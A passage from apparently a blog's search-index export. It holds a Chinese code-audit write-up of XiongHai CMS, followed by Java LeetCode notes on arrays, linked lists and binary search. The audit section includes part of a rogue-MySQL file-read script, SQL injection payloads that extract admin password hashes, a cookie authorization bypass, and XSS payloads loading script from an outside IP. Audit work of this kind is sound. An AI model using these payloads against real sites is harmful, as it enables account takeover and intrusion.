fread($s, 8192);  echo &quot;some shit ok... &quot;;  fwrite($s, unhex(&#x27;07 00 00 01 00 00 00 00  00 00 00&#x27;));  fread($s, 8192);  echo &quot;want file... &quot;;  fwrite($s, chr(strlen($filename) + 1) . &quot;\\x00\\x00\\x01\\xFB&quot; . $filename);  stream_socket_shutdown($s, STREAM_SHUT_WR);  echo &quot;\\n&quot;;  echo &quot;[+] $filename from $peer:\\n&quot;;  $len = fread($s, 4);  if(!empty($len)) &#123;    list (, $len) = unpack(&quot;V&quot;, $len);    $len &amp;= 0xffffff;    while ($len &gt; 0) &#123;      $chunk = fread($s, $len);      $len -= strlen($chunk);      echo $chunk;    &#125;  &#125;  echo &quot;\\n\\n&quot;;  fclose($s);&#125;\n\n越权漏洞inc目录下一般是配置文件，我们在checklogin.php中发现越权\n\n很简单的一个越权，这里只检验了cookie的user字段是否为空\n我们利用admin后台的其中一个页面wzlist.php做尝试\n/admin/?r=wzlistCookie: user=whatever\n\nSQL Injection/admin/files/login.php下，可以看到user参数被直接拼接，并且单引号闭合，还有报错提供\n\n之后会去判断密码的md5值是否和数据库中查出的对应用户的密码相同。这里也说明密码在数据库中已md5哈希值存储\n\n综上，这里的一种利用方式就是通过报错注入得到admin账户的密码，然后登录后台\n/admin/?r=loginuser=-1&#x27; and updatexml(1,concat(0x23,database(),0x23),1) #        //xhcms_v1.0user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,32),0x23),1) #   //manageuser=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;manage&#x27;),1,32),0x23),1) // id,user,name,password,img,mail,qq,date 8个字段user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(user,password) from manage),1,32),0x23),1) # // admin 21232f297a57a5a743894a0e4a801fc3\n\n拿到md5后去cmd5上解个密\n\n这样既可获得admin账户的用户名密码\n第二种方法就是sqlmap一把梭，原理是一样的（我这里没注出来）\n第三种方法是Y4师傅说的利用联合查询造出假数据，只要满足回显1行，并且md5的原值可知即可，还有注意字段数保持一致，满足8个字段（第4个字段为密码\nuser=1&#x27; union select 1,2,&#x27;RacerZ&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;,5,6,7,8 #password=1\n\n后台SQL\n关键词 mysql_query\n查看该文件，这里执行了一个删除操作，id字段参数可控，还是利用报错\n\n/admin/files/adset.php\n这里有一个addslashes限制，而且sql语句传参处加了引号，上下文也未作编码相关设置，所以没有宽字节注入的利用。\n这里有一篇利用trick总结以后遇到再看 https://cloud.tencent.com/developer/article/1077710\n\n/admin/files/editcolumn.php\n在type参数控制下，下面俩分支均可SQL注入（id可控）\n\n同时后面还有update操作也可控\n\n/admin/files/imageset.php\n这个页面有个文件上传功能，上传位置可知\n但是存在白名单过滤，仅能上传jpg|jpeg|gif|bmp|png后缀文件\n\n/files/content.php\n这里便是存在我们刚才说的addsalshes虽然加了，但是可以看到query那块的sql查询并没有使用引号包裹，那么我们直接查就可以了\n\n同理在/files/software.php下也是这种情况\n\n基本上存在表单的页面都有SQL注入hhhhhh。\nXSS在/files/contact.php页面中\n$page=addslashes($_GET[&#x27;page&#x27;]);if ($page&lt;&gt;&quot;&quot;)&#123;if ($page&lt;&gt;1)&#123;$pages=&quot;第&quot;.$page.&quot;页 - &quot;;&#125;\n这里会接收page参数，并回显\n\n一个典型的反射型XSS\n最基本的payload，注意闭合a标签\npage=&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&gt;\n如果我们想回显更复杂的字符串，就需要绕开引号导致addslashes的限制\n当然有个标签 SRC属性是可以不带引号的，尝试引入第三方js或第三方html页面\n&lt;SCRIPT SRC=http://43.140.198.45:81&gt;&lt;/SCRIPT&gt;page=&lt;/a&gt;&lt;SCRIPT SRC=http://43.140.198.45:81/xss.js&gt;&lt;/SCRIPT&gt;&lt;a&gt;\n或者\npage=&lt;/a&gt;&lt;script&gt;alert(/hacked by RacerZ/)&lt;/script&gt;&lt;a&gt;\n在/files/content.php中\nid可控，cookie也可控\n\n同时在前面，回显参数来自pinglun变量，该变量的值来自SQL查询interaction表，表名这里是否可利用存储型XSS，我们看下可提交存入数据库的参数是否存在过滤\n\n\n这里可以看到能提交name，email，url，content等参数，并且提交至/?r=submit&amp;type=comment&amp;cid=&lt;?php echo $id?&gt;，看下该页面对content变量的值做了防护，其他参数都没啥过滤\n\n\n再看看最终回显的参数有哪些，url和name参数是可回显的，url回显位置不太好在a标签的href处而且必须得包含http://，可以尝试在name处注入payload\n\n\n验证码逻辑问题我们在刚才的/files/content.php当中看到还引入了一个验证码\n\n查看/inc/code.class.php\n它这里的逻辑就是生成验证码图片并将对应的字符串存入SESSION\n\n我们看看验证逻辑，在/files/submit.php中，只是做了简单的比较操作，如果错误就退出也没有刷新操作。所以是可以被用来直接爆破的\n\n参考链接https://pino-hd.github.io/2018/06/10/%E7%86%8A%E6%B5%B7CMSv1-0/\nhttps://xz.aliyun.com/t/10393\nhttps://y4tacker.blog.csdn.net/article/details/111501407\nhttps://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%9E%B6%E6%9E%84\n","tags":["代码审计"]},{"title":"算法提升——数组和链表篇","url":"/2023/04/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/","content":"数组和链表\n基本概念\n基本存储结构：顺序存储、链式存储\n\n数组\n「随机访问特性的成因」：每个元素的内存地址可以直接推算出来。\n\n数组中的第一个元素地址已知\n每个元素占有的空间确定\n数组之间紧凑存储（链表就不是这样，其元素之间内存非连续分配）\n\n紧凑特性带来的代价：\n\n增删操作需要搬移整体元素\n扩容困难，只能重新申请大数组并整个复制旧数组中的元素\n\n「ArrayList 的原理分析」\n\n扩容/缩容机制实现：resize(int newCap)\n\n\n\n检查数组是否越界：checkElementIndex(int index)\n\n细节：position 索引实际定义的元素与元素之间的间隙索引\n\n数组尾部添加元素：addLast()\n写逻辑代码之前先作前置条件限制\n\n\n数组任意位置添加元素 add(int index, E element)\n先做数组搬移，再插入元素，size++\n\n\n\n链表\n底层原理：利用 next 指针来指向下一元素的内存地址\n非紧凑特性带来的代价：\n\n新增元素都需要为其维护指针的地址空间 \n\n\n\n「LinkList 的原理分析」\n\n链表结构（双链表）\n\n\n\nhead 和 tail 的占位符作用：事先创建两个空节点，避免删除和新增首尾节点时出现错误\n\n\n添加首部元素 addFirst(E e)\n\n\n\n\n\n删除首部元素 removeFirst()\n将指向最后一个元素的指针\n\n\n\n\n\n对于带有 index 指定节点的操作，需要先遍历定位节点\n细节：对于 index，判断一下其在整个链表中的指向位置，可以对遍历效率做一些优化\nadd(int index, E element)\n\n\n\nremove(int index) 同理\n\n单链表技巧套路「虚拟节点 dummy」的使用\n\n合并两个有序链表 =&gt; leetcode-21 合并两个有序链表\n这里为了简化指针的处理，可以添加一个「虚拟节点」，作为合成链表的头部起点（最后返回的时候从第二个节点返回即可）\n当你需要创造一条新链表的时候，可以使用虚拟头结点「简化边界」情况的处理\npublic ListNode mergeTwoLists(ListNode list1, ListNode list2) &#123;        ListNode p1 = list1, p2 = list2;        ListNode dummy = new ListNode(-1), p = dummy;        while(p1!=null &amp;&amp; p2!=null) &#123;            if (p1.val &gt; p2.val) &#123;                p.next = p2;                p2 = p2.next;            &#125; else &#123;                p.next = p1;                p1 = p1.next;            &#125;            p = p.next;        &#125;        if (p1 != null) &#123;            p.next = p1;        &#125;         if (p2 != null) &#123;            p.next = p2;        &#125;        return dummy.next;    &#125;\n进阶：\n前置：leetcode-204 计数质数\n利用的方法是 Sieve of Eratosthenes 素数筛\npublic int countPrimes(int n) &#123;        boolean[] isPrime = new boolean[n];        Arrays.fill(isPrime, true);        // 优化处理        for (int i = 2; i * i &lt; n; i++) &#123;            if (isPrime[i] == true) &#123;                // 优化处理 i 整数倍 考虑 2 时的 2x5 和 5 时的 5x2                for(int j = i * i; j &lt; n; j += i) &#123;                    isPrime[j] = false;                &#125;            &#125;        &#125;        int count = 0;        for (int i = 2; i &lt; n; i++) &#123;            if (isPrime[i] == true) &#123;                count++;            &#125;        &#125;        return count;    &#125;\n这里的优化部分都是看的平方项，可以参考如下：可以看到前后对称的\n12 = 2 × 612 = 3 × 412 = sqrt(12) × sqrt(12)12 = 4 × 312 = 6 × 2\n🚩回到正题：leetcode-264 丑数 II\n这道题结合素数筛的思路，可以直接定位 2 / 3 / 5 的倍数. 另外，结合合并链表的思想，我们实际上就是对三个链表进行去重合并，然后返回给定位置值即可\npublic int nthUglyNumber(int n) &#123;        int p2 = 1, p3 = 1, p5 = 1;        int[] ugly = new int[n + 1];        // 1 也是丑数        int product2 = 1, product3 = 1, product5 = 1;        int p = 1;        while (p &lt;= n) &#123;            int min = Math.min(product2, Math.min(product3, product5));            ugly[p] = min;            p++;            if (product2 == min) &#123;                // 这里应该作了优化，并非直接顺着各自链表，方便排除重复项；同时                // 取最小值避免遗漏                product2 = 2 * ugly[p2];                p2++;            &#125;             if (product3 == min) &#123;                product3 = 3 * ugly[p3];                p3++;            &#125;            if (product5 == min) &#123;                product5 = 5 * ugly[p5];                p5++;            &#125;        &#125;        return ugly[n];    &#125;\n\n单链表的分解 leetcode-86 分隔链表\n\n一张图可以看到，实际上这是一个分解再合并链表的过程：先分解成小于 x 和 大于 x 的两组链表，然后合并即可\npublic ListNode partition(ListNode head, int x) &#123;        ListNode dummy1 = new ListNode(-1), p1 = dummy1 ;        ListNode dummy2 = new ListNode(-1), p2 = dummy2;        ListNode p = head, temp;                while(p != null) &#123;            if (p.val &lt; x) &#123;                p1.next = p;                p1 = p1.next;            &#125; else &#123;                p2.next = p;                p2 = p2.next;            &#125;            // 注意原链表的 next            temp = p.next;            p.next = null;            p = temp;        &#125;        p1.next = dummy2.next;        return dummy1.next;    &#125;\n进阶：leetcode-1836 从未排序的链表中移除重复元素\n这道题本质蕴含了链表分解的思路，我们遍历两次链表，第一次记录哪些值出现重复，然后第二次将无重复的节点分解出来\n当然这里记录重复项用的是 HashMap\npublic ListNode deleteDuplicatesUnsorted(ListNode head) &#123;        ListNode p = head;    \t\t\t// 先遍历一遍链表，记录每个值出现的次数        HashMap&lt;Integer, Integer&gt; map = new HashMap();        while (p != null) &#123;            map.put(p.val, map.getOrDefault(p.val, 0) + 1);            p = p.next;        &#125;\t\t\t\t// 虚拟头结点（哨兵节点），存放结果链表        ListNode dummy = new ListNode(-1);        dummy.next = head;\t\t\t\t// 再遍历一遍节点，把重复出现的节点剔除        p = dummy;        while(p != null) &#123;          // unique 指针负责寻找不重复的节点            ListNode unique = p.next;            while (unique != null &amp;&amp; map.get(unique.val) &gt; 1) &#123;\t\t\t\t\t\t\t\t// 跳过重复节点，直到找到不重复的节点                unique = unique.next;            &#125;\t\t\t\t\t\t// 跳过重复节点，直到找到不重复的节点            p.next = unique;          // p 前进，继续寻找不重复节点            p = p.next;        &#125;        return dummy.next;    &#125;\n\nleetcode-88 合并两个有序数组\n这题看起来很像合并有序链表的思路，但是区别在于数组元素在物理上是连续排布的，直接按照合并链表的逻辑，将导致原数组元素被覆盖。但是这里给的第一个数组后面为空 0 元素，那么说明我们可以从大到小排布，这样即使前面的元素被覆盖了，但是也已经被使用过\npublic void merge(int[] nums1, int m, int[] nums2, int n) &#123;        int i = m - 1;        int j = n - 1;        int p = nums1.length - 1;        while (i &gt;= 0 &amp;&amp; j &gt;= 0) &#123;            if (nums1[i] &gt; nums2[j]) &#123;                nums1[p] = nums1[i];                i--;                p--;            &#125; else &#123;                nums1[p] = nums2[j];                j--;                p--;            &#125;        &#125;        while(j &gt;= 0) &#123;            nums1[p] = nums2[j];            j--;            p--;        &#125;    &#125;\n\nleetcode-977 有序数组的平方\n这里平方操作将导致所有的负数都变为正数，那么结合前面题的思路，我们可以将双指针放在两端，由非递减属性可知，平方后的元素肯定是两边大，中间小。双指针相向遍历判断大小然后倒着放在新数组中即可\npublic int[] sortedSquares(int[] nums) &#123;        int n = nums.length;        int i = 0, j = n - 1;        int[] res = new int[n];        int p = n - 1;        while(i &lt;= j) &#123;            if (Math.abs(nums[i]) &gt; Math.abs(nums[j])) &#123;                res[p] = nums[i] * nums[i];                p--;                i++;            &#125; else &#123;                res[p] = nums[j] * nums[j];                p--;                j--;            &#125;        &#125;        return res;    &#125;\n\nleetcode-360 有序转化数组\n这里二次函数要联想到它的抛物线，通过开口方向和对称轴位置来判断两侧的数值大小走向。我们仍然可以沿用双指针相向扫描的思路，只不过判断一下是先合并大的值还是小的值（对于开口向上的抛物线，越靠近抛物线值会越小，因此采用递减排列；对于开口向下的抛物线，越靠近抛物线值会越大，因此采用递增排列）\npublic int[] sortTransformedArray(int[] nums, int a, int b, int c) &#123;        int n = nums.length;        int i = 0, j = n - 1;        int p = a &gt; 0 ? n - 1: 0;        int[] res = new int[n];        while(i &lt;= j) &#123;            int v1 = f(nums[i], a, b, c);            int v2 = f(nums[j], a, b, c);            if (a &gt; 0) &#123;                if (v1 &gt; v2) &#123;                    res[p] = v1;                    p--;                    i++;                &#125; else &#123;                    res[p] = v2;                    p--;                    j--;                &#125;            &#125; else &#123;                if (v1 &gt; v2) &#123;                    res[p] = v2;                    p++;                    j--;                &#125; else &#123;                    res[p] = v1;                    p++;                    i++;                &#125;            &#125;        &#125;        return res;    &#125;    private int f(int x, int a, int b, int c) &#123;        return a*x*x + b*x + c;    &#125;\n\n🚩leetcode-151 反转字符串中的单词\n这题看起来就 split reverse and join 即可，但是里面存在空格问题不好处理。如果用双指针操作也是可以的，我可以将整个字符串先进行反转，再对字符串中的单词进行反转，当然字符串格式需要事先调整好空格数量\npublic String reverseWords(String s) &#123;        StringBuilder sb = new StringBuilder();                for(int i = 0; i &lt; s.length(); i++) &#123;            char c = s.charAt(i);            if (c != &#x27; &#x27;) &#123;                sb.append(c);            &#125; else if (!sb.isEmpty() &amp;&amp; sb.charAt(sb.length() - 1) != &#x27; &#x27;)                // 单词之间仅保留一个空格                sb.append(&#x27; &#x27;);            &#125;            // 考虑最后一个空格        if (sb.charAt(sb.length() - 1) == &#x27; &#x27;) &#123;            sb.deleteCharAt(sb.length() - 1);        &#125;        // 转换为字符数组操作单个字符        char[] str = sb.toString().toCharArray();        int n = str.length;        reversed(str, 0, n - 1);        for(int i = 0; i &lt; str.length;) &#123;            // 扫描单词            for (int j = i; j &lt; n; j++) &#123;                // 识别到单词                if (j + 1 == n || str[j + 1] == &#x27; &#x27; ) &#123;                    reversed(str, i, j);                    i = j + 2;                    break;                &#125;            &#125;                    &#125;        return new String(str);    &#125;    private void reversed(char[] arr, int i, int j) &#123;        while (i &lt; j) &#123;            char tmp = arr[i];            arr[i] = arr[j];            arr[j] = tmp;            i++;            j--;        &#125;    &#125;\n\n🚩合并 k 个有序链表 leetcode-23 合并K个升序链表\n\n\n这里为了每次能快速从 k 个节点中找到最小的放到合并链表上，引入「优先级队列（二叉堆）」结构\n\n优先级队列的实现就是基于二叉堆的「上浮」和「下沉」操作来完成的；\n\n时间复杂度：优先队列 pq 中的元素个数最多是 k，所以一次 poll 或者 add 方法的时间复杂度是 O(logk)；所有的链表节点都会被加入和弹出 pq，所以算法整体的时间复杂度是 O(Nlogk)，其中 k 是链表的条数，N 是这些链表的节点总数\n\nJava 提供了实现类 PriorityQueue\n\npublic ListNode mergeKLists(ListNode[] lists) &#123;    // don&#x27;t forget speical case    if (lists.length == 0) return null;      PriorityQueue&lt;ListNode&gt; queue = new PriorityQueue&lt;&gt;(lists.length, (x, y) -&gt; (x.val - y.val));    ListNode dummy = new ListNode(-1), p = dummy;    for(ListNode head: lists) &#123;        if (head != null)&#123;            queue.add(head);        &#125;    &#125;    while(!queue.isEmpty()) &#123;        ListNode min = queue.poll();        p.next = min;        p = p.next;        if (min.next != null) &#123;            queue.add(min.next);        &#125;    &#125;    return dummy.next;    &#125;\n\nleetcode-378 有序矩阵中第 K 小的元素\n可以把每一行或每一列看作一个链表，那么问题就变成了合并 k 个生序问题了.\n注意细节在于需要记录每个元素的位置，方便后面添加对应行的下一个元素\n数据结构可设计为 (value, i, j)\npublic int kthSmallest(int[][] matrix, int k) &#123;        int min = -1;        PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;(            (a, b) -&gt; (a[0] - b[0]));                for(int i = 0; i &lt; matrix.length; i++) &#123;            // 将指定的元素插入队列。如果队列已满，则返回false            pq.offer(new int[] &#123;matrix[i][0], i, 0&#125;);        &#125;        while (!pq.isEmpty() &amp;&amp; k &gt; 0) &#123;            int[] element = pq.poll();            min = element[0];            k--;            int index = element[1], j = element[2];            if ((j+1) &lt; matrix.length) &#123;                pq.add(new int[] &#123;matrix[index][j+1], index, j+1&#125;);            &#125;        &#125;        return min;    &#125;\n\nleetcode-373 查找和最小的 K 对数字\n同样可以看出来合并的意思在里头，如何构造待合并序列呢？\n\n妙哉，直接两两配对即可，而且每个链表我也可以保证是有序的\n当然要保留一个索引号来记录下一个放入队列的索引\n数据结构设计为 (value1, value2, index)\npublic List&lt;List&lt;Integer&gt;&gt; kSmallestPairs(int[] nums1, int[] nums2, int k) &#123;        PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;(            (a, b) -&gt; ((a[0] + a[1]) - (b[0] + b[1]))        );        for(int i = 0; i &lt; nums1.length; i++) &#123;            pq.offer(new int[] &#123;nums1[i], nums2[0], 0&#125;);        &#125;        ArrayList&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;();        while(!pq.isEmpty() &amp;&amp; k &gt; 0) &#123;            int[] element = pq.poll();            int j = element[2];            k--;            if (j + 1 &lt; nums2.length) &#123;                pq.offer(new int[]&#123;element[0], nums2[j+1], j+1&#125;);            &#125;            ArrayList pair = new ArrayList();            pair.add(element[0]);            pair.add(element[1]);            res.add(pair);        &#125;        return res;    &#125;\n\n\n单链表的倒数第 k 个节点（仅给出头节点） \n传统方法：从头节点遍历，得到链表长度 n ，再定位至 n-k+1 位置得到答案\n如何通过仅遍历一次链表就能定位到倒数第 k 个节点？\n利用双指针配合来定位：首先 p1 走 k 步到达某点，再走 n-k 步即可到达结尾空指针\n\n这时我们可以再用另一指针 p2，当 p1 到达第 k 个节点时，p2 同步出发直至 p1 到达空指针处\n\n应用：\n\n剑指 Offer 22. 链表中倒数第k个节点\npublic ListNode getKthFromEnd(ListNode head, int k) &#123;        ListNode dummy = new ListNode(-1);        dummy.next = head;        return realGetFromEnd(dummy, k);    &#125;    private ListNode realGetFromEnd(ListNode head, int k) &#123;        ListNode p1 = head, p2 = head;        for (int i = 0; i &lt; k; i++) &#123;            p1 = p1.next;        &#125;        while(p1 != null) &#123;            p1 = p1.next;            p2 = p2.next;        &#125;        return p2;    &#125;\n\nleetcode-19 删除链表的倒数第 N 个结点\n这里的思路就是找到倒数第 N+1 个节点，也就是目标节点的前驱。通过设置虚拟节点来避免删除第一个节点时产生的越界问题\npublic ListNode removeNthFromEnd(ListNode head, int n) &#123;        ListNode dummy = new ListNode(-1);        dummy.next = head;        ListNode prior = returnFromEnd(dummy, n+1); // 倒数第 n+1 个节点        ListNode Temp = prior.next;        prior.next = Temp.next;        Temp.next = null;        return dummy.next;    &#125;    private ListNode returnFromEnd(ListNode head, int n) &#123;        ListNode p1, p2;        p1 = head; p2 = head;        for(int i=0; i &lt; n; i++) &#123;            p1 = p1.next;        &#125;        while(p1 != null) &#123;            p2 = p2.next;            p1 = p1.next;        &#125;        return p2;    &#125;\n\n\n单链表的中点\n同样在仅知链表头节点的情况下传统方法先遍历获得长度 n ，然后再定位到 n/2 的节点上\n一遍遍历的思路本质上和之前倒数第 k 个节点一样，这里取名「快慢指针」更合适些，即慢指针每移动一步，快指针就移动两步，直至后者到达结尾处\n应用\n\nleetcode-876 链表的中间结点\n\npublic ListNode middleNode(ListNode head) &#123;            ListNode slow = head, fast = head;            while(fast != null &amp;&amp; fast.next != null) &#123;                slow = slow.next;                fast = fast.next.next;            &#125;            return slow;    &#125;\n\n如果链表长度为偶数，也就是说中点有两个的时候，我们这个解法返回的节点是靠后的那个节点\n\n判断链表是否包含环\n这个直接基于前面中点问题稍作修改即可，也就是在结果判定上，如果快指针遇到空指针就无环；而如果快指针遇到了满指针就说明有环\n进一步，如果链表中含有环，怎么计算环的起点？\n利用的还是快指针是慢指针步数 2 倍的性质：\n\n只要我们把快慢指针中的任一个重新指向 head，然后两个指针同速前进，k - m 步后一定会相遇，相遇之处就是环的起点了\n\n\n应用：\n\nleetcode-141 环形链表\npublic boolean hasCycle(ListNode head) &#123;        ListNode slow = head, fast = head;        while(fast != null &amp;&amp; fast.next != null) &#123;            slow = slow.next;            fast = fast.next.next;            if (slow == fast) &#123;                return true;            &#125;        &#125;        return false;    &#125;\n\nleetcode-142 环形链表 II\n\n\nListNode detectCycle(ListNode head) &#123;    ListNode fast, slow;    fast = slow = head;    while (fast != null &amp;&amp; fast.next != null) &#123;        fast = fast.next.next;        slow = slow.next;        if (fast == slow) break;    &#125;    // 上面的代码类似 hasCycle 函数    if (fast == null || fast.next == null) &#123;        // fast 遇到空指针说明没有环        return null;    &#125;    // 重新指向头结点    slow = head;    // 快慢指针同步前进，相交点就是环起点    while (slow != fast) &#123;        fast = fast.next;        slow = slow.next;    &#125;    return slow;&#125;\n两个链表是否相交\n\n这里主要需要解决的问题在于两条链表长度可能不同，无法通过分别遍历的方式使得两个链表指针同时指向相交节点\n一个巧妙思路就是，「逻辑上」将两个链表连接在一起，即两边指针均遍历完自己的节点后继续遍历对方的节点\n\n如果两者无相交，即 c1 节点对应空指针\npublic ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123;        ListNode p1 = headA, p2 = headB;        while(p1 != p2) &#123;            if (p1 != null) &#123;                p1 = p1.next;            &#125; else &#123;                p1 = headB;            &#125;            if (p2 != null) &#123;                p2 = p2.next;            &#125; else &#123;                p2 = headA;            &#125;        &#125;        return p1;    &#125;\n数组双指针技巧在数组中，指针的含义其实就是元素的索引。这里的双指针包含快慢指针和左右指针两种用法\n\n「快慢指针」技巧\n\n\n原地修改数组\n这里利用慢指针作为修改指针，快指针作为探路指针。如果快指针遇见非重复项，就告诉慢指针前进一步并修改元素\n\n这样，就保证了 nums[0..slow] 都是无重复的元素，当 fast 指针遍历完整个数组 nums 后，nums[0..slow] 就是整个数组去重之后的结果\n\n\n\npublic int removeDuplicates(int[] nums) &#123;        if (nums.length == 0) &#123;            return 0;        &#125;        int fast = 0, slow = 0;        while(fast != nums.length) &#123;            if (nums[fast] != nums[slow]) &#123;                slow++;                nums[slow] = nums[fast];            &#125;            fast++;        &#125;        return slow + 1;    &#125;\n应用：\n\nleetcode-26 删除有序数组中的重复项\n\nleetcode-83 删除排序链表中的重复元素\n本质是一样的，唯一区别在于数组赋值操作变成操作指针而已\npublic ListNode deleteDuplicates(ListNode head) &#123;        if (head == null )&#123;            return null;        &#125;        ListNode fast = head, slow = head;        while (fast != null) &#123;            if (fast.val != slow.val) &#123;                slow.next = fast;                slow = slow.next;            &#125;            fast = fast.next;        &#125;        // 考虑最后出现重复的情况        slow.next = null;        return head;    &#125;\n\n\n进阶：\n\nleetcode-82 删除排序链表中的重复元素 II\n\n这里不仅让你找出重复元素，而且还要全部除去\n双指针思路：\npublic ListNode deleteDuplicates(ListNode head) &#123;        ListNode dummy = new ListNode(-1);        ListNode p = dummy, q = head;        while (q != null) &#123;          // 发现重复节点，跳过这些重复节点            if (q.next != null &amp;&amp; q.val == q.next.val) &#123;                while (q.next != null &amp;&amp; q.val == q.next.val) &#123;                    q = q.next;                &#125;                q = q.next;              // 此时 q 跳过了这一段重复元素                                if (q == null) &#123;                    p.next = null;                &#125;              // 不过下一段元素也可能重复，等下一轮 while 循环判断            &#125; else &#123;              // 不是重复节点，接到 dummy 后面                p.next = q;                p = p.next;                q = q.next;            &#125;        &#125;        return dummy.next;    &#125;\n还有一种递归解法：\n// 递归解法class Solution2 &#123;    // 定义：输入一条单链表头结点，返回去重之后的单链表头结点    public ListNode deleteDuplicates(ListNode head) &#123;        // base case        if (head == null || head.next == null) &#123;            return head;        &#125;        if (head.val != head.next.val) &#123;            // 如果头结点和身后节点的值不同，则对之后的链表去重即可            head.next = deleteDuplicates(head.next);            return head;        &#125;        // 如果如果头结点和身后节点的值相同，则说明从 head 开始存在若干重复节点        // 越过重复节点，找到 head 之后那个不重复的节点        while (head.next != null &amp;&amp; head.val == head.next.val) &#123;            head = head.next;        &#125;        // 直接返回那个不重复节点开头的链表的去重结果，就把重复节点删掉了        return deleteDuplicates(head.next);    &#125;&#125;\n\n原地删除数组\n\n我们想把数组 nums 中所有值为 val 的元素原地删除\n\n思路：如果 fast 遇到值为 val 的元素，则直接跳过，否则就赋值给 slow 指针，并让 slow 前进一步\n应用：\n\nleetcode-27 移除元素\n这里注意和去重操作时的区别在于满指针增加的位置\npublic int removeElement(int[] nums, int val) &#123;        int slow = 0, fast = 0;        while (fast != nums.length) &#123;            if (nums[fast] != val) &#123;                nums[slow] = nums[fast];                slow++;            &#125;            fast++;        &#125;        return slow;    &#125;\n\nleetcode-283 移动零\n这里的思路其实就是原地删除的思路，删掉所有的 0 元素，然后最后在末尾补 0 即可\npublic void moveZeroes(int[] nums) &#123;        int fast = 0, slow = 0;        while(fast != nums.length) &#123;            if (nums[fast] != 0) &#123;                nums[slow] = nums[fast];                slow++;            &#125;            fast++;        &#125;        while(slow != nums.length) &#123;            nums[slow] = 0;            slow++;        &#125;    &#125;\n\n\n\nTODO：滑动窗口算法\n\n\n\n「左右指针」技巧\n\n\n二分查找\n\n查找框架\nint binarySearch(int[] nums, int target) &#123;    int left = 0, right = ...;    while(...) &#123;        int mid = left + (right - left) / 2;        if (nums[mid] == target) &#123;            ...        &#125; else if (nums[mid] &lt; target) &#123;            left = ...        &#125; else if (nums[mid] &gt; target) &#123;            right = ...        &#125;    &#125;    return ...;&#125;\n三点细节：\n\n... 部分是需要仔细审查的地方\nmid = left + (right - left) / 2 与 (left + right) / 2 本质上是一样的，但前者可以有效解决 left 和 right 太大导致的整数溢出问题\n所有 else if 写清楚\n\n缺陷：\n\n\n典型例题：\nleetcode-704. 二分查找\npublic int search(int[] nums, int target) &#123;        int left = 0, right = nums.length - 1;        while(left &lt;= right) &#123;            int mid = left + (right - left) / 2;            if (nums[mid] == target) &#123;                return mid;            &#125; else if (nums[mid] &lt; target) &#123;                left = mid + 1;            &#125; else if (nums[mid] &gt; target) &#123;                right = mid - 1;            &#125;        &#125;        return -1;    &#125;\n\n寻找左侧边界的二分搜索\nint left_bound(int[] nums, int target) &#123;    int left = 0;    int right = nums.length; // 注意        while (left &lt; right) &#123; // 注意        int mid = left + (right - left) / 2;        if (nums[mid] == target) &#123;            right = mid;        &#125; else if (nums[mid] &lt; target) &#123;            left = mid + 1;        &#125; else if (nums[mid] &gt; target) &#123;            right = mid; // 注意        &#125;    &#125;    return left;&#125;\n首先右侧边界改变，因此搜索区间为左闭右开区间；其次，由于是要找左侧边界，因此当找到符合目标值时不是直接返回，而是进一步压缩右侧边界，不断向左侧边界逼近\n如果要判断 left 索引是否是目标值，则：\n注意要先判断下标是否越界\nwhile (left &lt; right) &#123;    //...&#125;// 此时 target 比所有数都大，返回 -1if (left == nums.length) return -1;// 判断一下 nums[left] 是不是 targetreturn nums[left] == target ? left : -1;\n\n寻找右侧边界的二分查找\nint right_bound(int[] nums, int target) &#123;    int left = 0, right = nums.length;        while (left &lt; right) &#123;        int mid = left + (right - left) / 2;        if (nums[mid] == target) &#123;            left = mid + 1; // 注意        &#125; else if (nums[mid] &lt; target) &#123;            left = mid + 1;        &#125; else if (nums[mid] &gt; target) &#123;            right = mid;        &#125;    &#125;    return left - 1; // 注意&#125;\n这里还是采用左闭右开的搜索区间，注意：\n\n当找到一个目标值时，左侧区间向右边界靠拢\n\n因为每次对 left 更新都是 left = mid + 1，就是说 while 循环结束时，nums[left] 一定不等于 target 了，而 nums[left-1] 可能是 target (根据更新操作来看)。\n\n对于返回索引是否为目标值的判断，这里考虑的是下界可能会越界\nwhile (left &lt; right) &#123;    // ...&#125;// 判断 target 是否存在于 nums 中// 此时 left - 1 索引越界if (left - 1 &lt; 0) return -1;// 判断一下 nums[left] 是不是 targetreturn nums[left - 1] == target ? (left - 1) : -1;\n\n\n\n左闭右闭形式模板\nint binary_search(int[] nums, int target) &#123;    int left = 0, right = nums.length - 1;     while(left &lt;= right) &#123;        int mid = left + (right - left) / 2;        if (nums[mid] &lt; target) &#123;            left = mid + 1;        &#125; else if (nums[mid] &gt; target) &#123;            right = mid - 1;         &#125; else if(nums[mid] == target) &#123;            // 直接返回            return mid;        &#125;    &#125;    // 直接返回    return -1;&#125;int left_bound(int[] nums, int target) &#123;    int left = 0, right = nums.length - 1;    while (left &lt;= right) &#123;        int mid = left + (right - left) / 2;        if (nums[mid] &lt; target) &#123;            left = mid + 1;        &#125; else if (nums[mid] &gt; target) &#123;            right = mid - 1;        &#125; else if (nums[mid] == target) &#123;            // 别返回，锁定左侧边界            right = mid - 1;        &#125;    &#125;    // 判断 target 是否存在于 nums 中    // 此时 target 比所有数都大，返回 -1    if (left == nums.length) return -1;    // 判断一下 nums[left] 是不是 target    return nums[left] == target ? left : -1;&#125;int right_bound(int[] nums, int target) &#123;    int left = 0, right = nums.length - 1;    while (left &lt;= right) &#123;        int mid = left + (right - left) / 2;        if (nums[mid] &lt; target) &#123;            left = mid + 1;        &#125; else if (nums[mid] &gt; target) &#123;            right = mid - 1;        &#125; else if (nums[mid] == target) 